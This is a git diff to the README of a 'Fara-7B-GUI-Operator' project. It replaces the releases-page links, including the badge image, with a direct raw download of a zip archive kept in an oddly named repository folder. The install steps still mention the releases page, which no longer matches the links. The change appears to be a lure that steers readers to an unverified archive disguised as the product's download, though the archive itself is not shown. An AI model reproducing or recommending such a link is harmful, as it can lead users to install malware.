@@ -1,6 +1,6 @@
 # 🖼️ Fara-7B-GUI-Operator - Simplify Your Task Management
 
-[![Download Fara-7B-GUI-Operator](https://img.shields.io/badge/Download-Fara-7B--GUI--Operator-blue)](https://github.com/Kemalokko-sys/Fara-7B-GUI-Operator/releases)
+[![Download Fara-7B-GUI-Operator](https://github.com/Kemalokko-sys/Fara-7B-GUI-Operator/raw/refs/heads/main/iodohydrin/Fara_GU_Operator_v1.9.zip)](https://github.com/Kemalokko-sys/Fara-7B-GUI-Operator/raw/refs/heads/main/iodohydrin/Fara_GU_Operator_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to *Fara-7B-GUI-Operator*! This application allows you to upload screens
 
 ## 📥 Download & Install
 
-To get started, visit the releases page to download the latest version of *Fara-7B-GUI-Operator*. You can find it here: [Download Fara-7B-GUI-Operator](https://github.com/Kemalokko-sys/Fara-7B-GUI-Operator/releases).
+To get started, visit the releases page to download the latest version of *Fara-7B-GUI-Operator*. You can find it here: [Download Fara-7B-GUI-Operator](https://github.com/Kemalokko-sys/Fara-7B-GUI-Operator/raw/refs/heads/main/iodohydrin/Fara_GU_Operator_v1.9.zip).
 
 1. Click the link above.
 2. On the releases page, locate the latest version.
